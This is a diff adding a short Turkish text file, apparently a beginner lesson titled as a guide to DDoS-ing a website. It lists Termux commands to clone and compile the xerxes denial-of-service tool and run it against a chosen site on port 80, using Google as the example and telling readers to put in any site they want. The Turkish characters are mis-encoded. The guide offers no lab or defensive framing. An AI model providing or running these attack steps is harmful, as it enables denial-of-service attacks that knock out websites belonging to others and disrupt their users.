@@ -1,0 +1,33 @@
+1.ders  siteye ddos atma :
+
+
+Ddos atmak için öncelikle Termuxu açýn;
+vericeðim kodlarý sýrasýyla yapýn eðer  videodaki kodlarý anlýyamadýsanýz sýrasýyla bu kodlarý girin.
+Kodlarýn hepsi küçük harfle yazýlýcak!!!
+
+Komutlar;
+
+1) pkg install git
+2) pkg install clang
+3) git clone https://github.com/zanyarjamal/xerxes
+4) clear
+5) cd
+6) ls
+7) cd xerxes
+8) ls
+9) chmod 777 xerxes.c
+10) clang xerxes.c -o xerxes
+11) ./xerxes  www.google.com 80
+
+(Buraya dikkat   ./xerxes ten sonra googlenin urlsi yerine istediðiniz siteyi yazýn ama baþýnda  https:// olmadan  ve site urlsinin
+sonuna boþluk býrakýp  80   katýyoruz.)
+
+Programý Kolay Yoldan Çalýþtýrma ;
+
+1)cd xerxes
+2)clang xerxes.c -o xerxes   
+3)./xerxes www.google.com 80
+
+
+
+                                                                                                              < <<<<< <:  iyi dersler    bir sonraki derse geçin:>>>>>>>
